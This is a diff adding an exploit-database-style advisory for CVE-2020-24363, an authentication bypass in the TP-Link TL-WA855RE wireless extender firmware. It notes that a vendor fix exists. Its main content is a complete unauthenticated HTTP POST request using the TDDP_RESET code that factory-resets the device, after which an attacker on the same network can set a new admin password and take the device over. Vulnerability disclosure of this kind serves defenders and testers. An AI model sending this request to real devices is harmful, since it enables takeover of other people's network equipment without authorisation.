@@ -1,0 +1,28 @@
+# Exploit Title: TP-Link TL-WA855RE V5_200415 - Device Reset Auth Bypass
+# Date: 2020/07/29
+# Exploit Author: malwrforensics
+# Vendor Homepage: https://tp-link.com
+# Software link: https://static.tp-link.com/2020/202004/20200430/TL-WA855RE_V5_200415.zip
+# Version: TL-WA855RE(US)_V5_200415
+# Tested on: N/A
+# CVE : 2020-24363 
+Important: The vendor has released a fix; the new firmware (TL-WA855RE(US)_V5_200731) is available to download from: https://www.tp-link.com/us/support/download/tl-wa855re/v5/#Firmware
+
+Details
+By default the web interface of the TL-WA855RE wireless extender require users to log in in order to access the admin interface. However, an attacker, on the same network, can bypass it and use the APIs provided to reset the device to its factory settings by using the TDDP_RESET code. An attacker can then set up a new admin password, resulting in a complete takeover of the device.
+To test, you can send a POST request like the one below using the TDDP_RESET (5). The request doesn't need any type of authentication. You can then access the web interface and set a new administrative password.
+
+POST /?code=5&asyn=0 HTTP/1.1
+Host: <redacted>
+Content-Length: 7
+Accept: text/plain, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0
+Content-Type: text/plain;charset=UTF-8
+Origin: http://<redacted>
+Referer: http://<redacted>
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+0|1,0,0
